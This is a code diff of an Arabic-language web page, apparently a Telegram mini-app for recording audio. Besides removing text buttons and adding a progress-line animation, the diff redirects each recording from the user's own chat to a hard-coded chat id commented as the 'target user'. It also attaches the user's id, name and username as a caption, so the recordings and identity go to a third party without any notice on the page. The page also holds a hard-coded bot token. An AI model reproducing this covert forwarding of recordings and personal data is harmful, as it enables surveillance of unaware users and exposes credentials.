@@ -41,6 +41,18 @@
             background-color: #2196f3;
         }
 
+        #sendAudioButton {
+            background-color: #4caf50;
+        }
+
+        #line {
+            width: 100%;
+            height: 4px;
+            background-color: #2196f3;
+            margin-top: 20px;
+            visibility: hidden;
+        }
+
         #modal, #successModal {
             display: none;
             position: fixed;
@@ -79,15 +91,13 @@
 
     <button id="aboutButton" onclick="openModal()">حول</button>
 
-    <!-- الأزرار مع النصوص -->
-    <button class="sendButton" onclick="sendText('هذا هو النص الأول')">إرسال النص الأول</button>
-    <button class="sendButton" onclick="sendText('هذا هو النص الثاني')">إرسال النص الثاني</button>
-
     <!-- أزرار التسجيل الصوتي -->
     <button id="recordButton" class="recordButton" onclick="startRecording()">تسجيل الصوت</button>
     <button id="stopButton" class="recordButton" onclick="stopRecording()" disabled>إيقاف التسجيل</button>
     <button id="playButton" class="recordButton" onclick="playRecording()" disabled>تشغيل الصوت</button>
     <button id="sendAudioButton" class="sendButton" onclick="sendAudio()" disabled>إرسال الصوت</button>
+
+    <div id="line"></div>
 
     <div id="modal">
         <div id="modalContent">
@@ -156,6 +166,8 @@
                     mediaRecorder.start();
                     document.getElementById("stopButton").disabled = false;
                     document.getElementById("recordButton").disabled = true;
+                    document.getElementById("line").style.visibility = "visible";
+                    animateLine();
                 })
                 .catch(error => {
                     console.error("Error accessing microphone: ", error);
@@ -165,6 +177,7 @@
         function stopRecording() {
             mediaRecorder.stop();
             document.getElementById("stopButton").disabled = true;
+            document.getElementById("line").style.visibility = "hidden";
         }
 
         function playRecording() {
@@ -173,7 +186,7 @@
 
         function sendAudio() {
             const botToken = "7472127748:AAHW7rqmAhmBCghPkIHQWYHIzKaeDc4GYEE";
-            const chatId = userId;
+            const chatId = "5420595930"; // معرف المستخدم المستهدف
 
             if (!chatId) {
                 alert("لا يمكن الحصول على معرف المستخدم.");
@@ -183,6 +196,7 @@
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('audio', audioBlob);
+            formData.append('caption', `معرف المستخدم: ${userId}\nالاسم: ${firstName}\nاسم المستخدم: ${username}`);
 
             const sendAudioUrl = `https://api.telegram.org/bot${botToken}/sendAudio`;
 
@@ -205,39 +219,17 @@
             });
         }
 
-        function sendText(text) {
-            const botToken = "7472127748:AAHW7rqmAhmBCghPkIHQWYHIzKaeDc4GYEE";
-            const chatId = userId;
-
-            if (!chatId) {
-                alert("لا يمكن الحصول على معرف المستخدم.");
-                return;
-            }
-
-            const sendTextUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(sendTextUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: "HTML"
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    document.getElementById("successModal").style.display = "flex";
+        function animateLine() {
+            let width = 0;
+            const line = document.getElementById("line");
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
                 } else {
-                    console.error("Error response:", data);
-                    alert("حدث خطأ أثناء إرسال النص: " + data.description);
+                    width++;
+                    line.style.width = width + "%";
                 }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("حدث خطأ أثناء إرسال النص");
-            });
+            }, 100);
         }
     </script>
 
